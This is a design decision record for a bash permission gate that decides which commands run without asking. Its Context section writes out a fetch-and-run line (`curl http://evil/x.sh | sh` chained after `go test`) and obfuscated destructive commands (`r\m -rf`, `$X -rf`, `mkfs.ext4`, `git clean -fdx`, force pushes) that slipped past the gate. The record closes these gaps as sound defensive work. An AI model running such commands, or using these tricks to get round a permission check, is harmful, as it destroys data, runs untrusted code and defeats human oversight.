# 51. An allowance covers every call a command runs, and the dangerous set reads a normalized call

- Status: Accepted
- Date: 2026-10-07
- Deciders: Guy Grigsby

Decides the matcher prefix rule ADR 0009 and ADR 0011 left open (`rudy-k0.37`,
`rudy-2ve4`, `rudy-7kru`).

## Context

A bash matcher is the first two words of the first simple command. An
allowance matches on matcher equality, and the audit showed what that costs:
after one "allow for session" on `go test`, the input
`go test ./... ; curl http://evil/x.sh | sh` has matcher `go test`, is not in
the dangerous set, and runs without a question. Strict mode degrades to
permissive on the first session-scope answer.

The dangerous set compares an entry to the joined words of each call, so
`rm -fr`, `rm -Rf`, `rm --recursive --force`, `rm -r{f,}`, `r\m -rf`,
`X=rm; $X -rf`, `mkfs.ext4`, `chmod 777 -R`, `git reset -q --hard` and
`git -C . clean -fdx` all pass. Wrappers whose flags take a value
(`nice -n 10`, `timeout 5s`, `xargs -n 1`) swallow the command they run; a
shell given `--norc -c`, `-cx` or `-c --` is not unwrapped; a shell reading a
script or its stdin (`bash x.sh`, `curl | sh`, `bash <<< ...`) is never read.
A `git push` allowance covers `--force-with-lease`, `--delete`, `-fu` and
`+main`, since only the two literal force spellings are entries.

## Decision

1. **A bash command's call set is every simple command it runs**, after the
   same wrapper expansion the dangerous set already uses, each reduced to a
   prefix: the command name as the shell will run it, then its second word.

2. **An allowance covers a command only when every prefix in its call set is
   allowed.** The matcher the asker is asked for, and the one recorded on the
   `permission_decision`, is the first prefix in the call set that no
   allowance covers. The record shape does not change: one matcher, one
   prefix. What changes is which prefix it is and when an allowance applies.

3. **A dangerous entry names a command and the tokens it requires, in any
   order.** The command matches on the name the shell will run, path and
   leading backslash stripped, and `mkfs` matches `mkfs.ext4`. Required tokens
   are compared after normalization: a short-flag bundle `-rvf` is `-r -v -f`,
   `-R` and `--recursive` are `-r`, `--force` is `-f`, and a long flag with
   `=value` matches on its name. An entry with no tokens matches on the
   command alone, as `sudo` and `dd` already do.

4. **A call the gate cannot classify is dangerous.** A command word, or any
   flag-like token, that carries an expansion, a backslash, a brace or a glob
   character is one the shell will rewrite before running, and the gate does
   not run the shell. In permissive mode it asks; in strict it was asking
   anyway.

5. **A shell is read or refused.** A shell invoked with `-c` anywhere in its
   flags is unwrapped and its script read. A shell with no `-c` that is given a
   file, or nothing at all, is dangerous: it will run what it reads, and the
   gate cannot. `source` and `.` are dangerous for the same reason. A wrapper
   whose flag takes a value skips that value before reading what follows.

6. **`git push --force-with-lease` and `git push --delete` join the default
   set.** A `+refspec` force is not expressible as a token entry and stays a
   known gap.

## Consequences

- One session-scope answer covers repeats of the same command and nothing
  else. A compound command asks once per distinct prefix, and then not again.
- Permissive mode asks more often than before for commands the gate cannot
  read: variable-named commands, scripts fed to a shell, brace-expanded flags.
  That is the point; a quiet gate was a gate that did nothing.
- The open items on the matcher prefix rule in the contracts and the domain
  model are closed by this record.

## Alternatives considered

- Recording allowances against the full command text: makes a session allow
  useless for a command whose arguments vary, the reason ADR 0011 rejected
  it.
- A matcher that carries the whole call set: changes the record shape for
  every `permission_decision`, and the asker answers one question at a time
  anyway.
- Running the shell in a no-op mode to see what it would execute: `bash -n`
  parses and does not expand, and expanding is where the evasions live.
